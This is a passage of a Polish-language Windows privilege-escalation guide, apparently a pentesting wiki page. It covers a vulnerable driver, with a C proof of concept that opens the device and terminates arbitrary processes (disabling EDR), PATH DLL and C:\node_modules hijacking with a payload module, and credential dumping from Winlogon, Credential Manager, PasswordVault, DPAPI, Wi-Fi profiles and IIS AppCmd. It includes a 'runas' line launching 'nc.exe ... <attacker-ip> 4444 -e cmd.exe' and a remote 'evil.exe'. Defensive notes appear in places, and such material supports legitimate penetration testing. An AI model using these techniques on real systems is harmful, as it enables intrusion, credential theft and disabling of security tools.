- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej skalarniej kontrolowaną przez atakującego **ujemną** wartość, kolejne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów stosu. Często jest to najprostsza droga do pełnego nadpisania wskaźnika callback.

Skuteczny wzorzec do wyszukiwania: **odczyty różnych typów z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt z rejestru decyduje o wykonaniu drugiego.

#### Wykorzystanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + unieszkodliwienie EDR)

Niektórzy podpisani sterowniki firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana podczas otwierania urządzenia przez ścieżkę zawierającą dodatkowy składnik, co pozwala każdemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (przykład z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może wykorzystać udostępnione przez sterownik uprzywilejowane IOCTL-e do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM przez DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowych danych dysku (manipulacje offline, sztuczki z trwałością przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia unieszkodliwienie AV/EDR z poziomu przestrzeni użytkownika za pośrednictwem kernela.

Minimalny schemat PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla programistów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego podczas wykonywania uprzywilejowanych operacji. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele brokerowane zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń w trybie użytkownika (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycia.
- Wymuś stosowanie listy zablokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych i zablokowanych elementów.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się na PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów na PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak nadużyć tej kontroli:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezpośredni, taki jak `require("foo")`, a oczekiwanego modułu **brakuje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows ta ścieżka może sięgać katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i czekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie wykonany w kontekście zabezpieczeń procesu ofiary, co prowadzi do **LPE**, jeśli proces docelowy działa jako administrator, jako część podwyższonego zadania zaplanowanego lub usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z buildów produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania:<sup>[[23]](#references)</sup>

- Ustaw filtr `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces opakowujący)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na wpisach `NAME NOT FOUND` oraz ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukania podczas przeglądu kodu rozpakowanych plików `.asar` lub źródeł aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **nazwę brakującego pakietu** na podstawie Procmon lub przeglądu kodu źródłowego.
2. Utwórz katalog wyszukiwania w katalogu głównym, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Przykłady brakujących modułów opcjonalnych, które pasują do tego wzorca w rzeczywistych przypadkach, to `bluebird` i `utf-8-validate`. **Technika** jest jednak uniwersalna: znajdź dowolny **brakujący bare import**, który uprzywilejowany proces Windows Node/Electron spróbuje rozwiązać.

### Wykrywanie i hardening

- Generuj alerty, gdy użytkownik tworzy `C:\node_modules` lub zapisuje tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności, które odczytują pliki z `C:\node_modules\*`.
- Dołączaj wszystkie zależności runtime do wersji produkcyjnej i kontroluj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne sondy, jeśli biblioteka to obsługuje (na przykład niektóre wdrożenia `ws` mogą pominąć legacy probe `utf-8-validate` za pomocą `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts są na sztywno wpisane inne znane komputery.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz **usługi objęte ograniczeniami**

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera skoreluj jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie z wyższymi uprawnieniami to odrębny cel analizy: listener i ścieżka pliku binarnego to jedynie wskazówki, natomiast uwierzytelniona ścieżka wykorzystująca uszkodzenie pamięci wymaga analizy dokładnie tego pliku binarnego i dostępnych dla niego danych wejściowych. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, sprawdź [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz mu usługę backendową; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby poznać polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej [poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się okno GUI z pytaniem, czy `nc` ma być dozwolone przez zaporę).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linuxowy użytkownik `root` w WSL sam w sobie nie zapewnia uprawnień administratora systemu Windows. Jeśli bieżąca tożsamość systemu Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach oraz dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; w WSL 2 dystrybucja jest zwykle przechowywana na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego wyliczania.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza znalezisko w rejestrze zawierające hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników dotyczące serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail i automatycznie logować się do nich za pomocą przeglądarek, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows wymagająca poświadczeń do uzyskania dostępu do zasobu** (serwera lub witryny internetowej) **może korzystać z tego Menedżera poświadczeń** i Windows Vault oraz używać zapisanych poświadczeń zamiast za każdym razem prosić użytkowników o podanie nazwy użytkownika i hasła.

Jeśli aplikacje nie komunikują się z Menedżerem poświadczeń, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z magazynu, powinna w jakiś sposób **komunikować się z Menedżerem poświadczeń i żądać poświadczeń dla tego zasobu** z domyślnego magazynu.

Użyj `cmdkey`, aby wyświetlić listę poświadczeń zapisanych na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem poświadczeń.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Pamiętaj, że można też użyć mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub modułu Powershell [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci jawnego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń magazynowa jest izolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych uwierzytelniających użytkownika używanych przy logowaniu**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, przechowywany w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, więc nie można wyświetlić jego zawartości za pomocą polecenia `dir` w CMD, ale można to zrobić w PowerShellu).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptów** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Jeśli skrypt lub inwentaryzacja plików wskazuje na taki plik, ustal rzeczywisty katalog profilu konta zamiast zakładać, że znajduje się on w `C:\Users`: [Windows może przechowywać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Plik, który można odczytać, jest jedynie wskazówką; [polecenie Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, z których je wyeksportowano](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi ponadto mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL-e, nie wyświetlając zaszyfrowanych ani jawnych wartości podczas rutynowej enumeracji.

Aby **odszyfrować** poświadczenia PS z pliku, w którym się znajdują, możesz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwykłych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za wskazówkę dotyczącą poświadczeń. Zapisana wartość nie jest hasłem DPAPI/RDCMan; możliwość jej odzyskania zależy od ustawień szyfrowania pliku i tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego wyszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być również czytelne w katalogach użytkowników lub współdzielonym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako wskazówkę dotyczącą poświadczeń, nie wyświetlając go ani nie zakładając, że zawiera tekst jawny: [producent podaje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na którym go utworzono, albo skonfigurowana mniej restrykcyjnie. Zanim na nim polegasz, potwierdź pochodzenie pliku i warunki odzyskania danych.

### Sticky Notes

Użytkownicy często korzystają z aplikacji StickyNotes na stacjach roboczych z systemem Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się w lokalizacji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać oraz sprawdzić.

Użytkownicy czasami zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Pakietowa aplikacja Sticky Notes firmy Microsoft zwykle przechowuje notatki w lokalizacji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych magazynów w profilu użytkownika, w tym LevelDB. Zidentyfikuj zainstalowaną aplikację i format przechowywania danych, zanim uznasz brak pliku SQLite za dowód braku notatek.

Jeśli Sticky Notes używa dziennika WAL SQLite, sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych i dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest tylko wskazówką dotyczącą poświadczeń: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji specyficznej dla aplikacji, zanim będzie można go uznać za potwierdzenie logowania z wyższymi uprawnieniami.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić go na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano jakieś **poświadczenia**, które można **odzyskać**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (dane uwierzytelniające)

### Artefakty danych uwierzytelniających w rejestrze narzędzi wsparcia

Niektóre starsze instalacje narzędzi do zdalnego wsparcia zachowują nazwy wartości związanych z hasłami w stałych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer wskazywało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do dalszej analizy: przed oceną tych danych uwierzytelniających sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format i bieżące zachowanie uwierzytelniania. Przejście od hasła do narzędzia zdalnego wsparcia do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła oraz uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w wynikach rutynowej enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny udostępniony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczającą; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Analizuj wyłącznie pliki, do których masz uprawnienia i które są istotne, oraz unikaj wyświetlania potencjalnych sekretów podczas szerokiej enumeracji. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją dane uwierzytelniające ani że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

